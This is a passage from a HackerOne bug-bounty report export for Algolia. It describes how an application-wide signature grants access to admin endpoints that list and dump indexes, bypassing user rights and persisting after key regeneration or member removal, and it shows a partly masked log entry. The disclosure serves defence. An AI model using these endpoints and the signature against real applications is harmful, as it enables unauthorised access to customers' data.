\"/1/indexes/QQQQQQQQ?x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.14.1&x-algolia-application-id=****&x-algolia-api-key=3f30****************************\",\n                \"ip\": \"xxxxx\",\n                \"query_headers\": \"...\",\n                \"sha1\": \"ee9f6ad7345be899f3a81b0b150bb75c9abc46e3\",\n                \"nb_api_calls\": \"1\",\n                \"processing_time_ms\": \"1\",\n                \"index\": \"QQQQQQQQ\"\n            }\n```\n\nClearly, the attacker can dump all indeces if he just goes back far enough where they were created.\n\nThe other two endpoints I found are `/1/admin/stats/INDEXNAME`, which returns the same as `/1/admin/listIndexes`, but only for one specific index and `/1/admin/building`, which purpose I didn't quite figure out.\n\nFinal note\n-----------\n\nNote that the signature is application specific and completely API key independent.\n\nFor one that means, if I use the users API key to list indexes via `/1/indexes` endpoint, it will only return an answer if I ahve given the user `listIndexes` rights and it will only return those indeces he has access to. Whereas with the signature the users rights are completely ignored.\n\nIt also means though, that if I remove an old team member he still continues to have access to the above endpoints. Even if the admin regenrates the admin API key, the signature remains the same. Therefore, once a team member obtained the signature, he will have access indefinitely to the application. The owner can't do anything as far as I can tell.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://algolia.com", 
            "about": "Hosted search API that delivers instant and relevant results from the first keystroke", 
            "twitter_handle": "algolia", 
            "name": "Algolia"
        }, 
        "handle": "algolia", 
        "url": "https://hackerone.com/algolia", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/443/e5b082d816c5ab9f060fed192e8c6e436b74a4ef_small.png?1501262446", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/443/aea99e8de90abf447f941c9a7936ead51a6ee03f_medium.png?1501262446"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 443, 
        "default_currency": "usd"
    }, 
    "is_published": false
}